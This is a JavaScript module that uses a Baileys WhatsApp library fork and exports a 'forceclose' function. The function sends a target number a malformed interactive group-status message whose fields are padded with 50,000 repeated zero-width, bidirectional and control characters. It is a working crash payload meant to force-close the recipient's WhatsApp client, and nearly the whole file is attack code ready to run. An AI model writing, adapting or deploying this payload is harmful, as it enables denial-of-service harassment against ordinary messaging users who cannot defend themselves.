const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    encodeSignedDeviceIdentity,
    processTime,
    fetchLatestBaileysVersion,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');


async function forceclose(sock, target) {
    if (!sock || !target) {
        console.log('[forceclose] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never target the paired number itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[forceclose] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    try {
        const N = 50000;
        const nanX = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            bloksWidget: {
                                fallback: "\u200D".repeat(N),
                                type:     "\u200F".repeat(N),
                                data:     "\[".repeat(N),
                                uuid:     "\u200B".repeat(N),
                            },
                            subtitle: "\u0010".repeat(N),
                            title:    "X".repeat(N),
                        },
                        nativeFlowMessage: { buttons: [{}] },
                        body: { text: "\u000F" },
                    },
                },
            },
        };

        const msg = generateWAMessageFromContent(target, nanX, {});

        await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id,
            noSelfSync: true,
        });
    } catch (e) {
        console.log('[forceclose]', (e && e.message) ? e.message : e);
    }
}


module.exports = { forceclose };
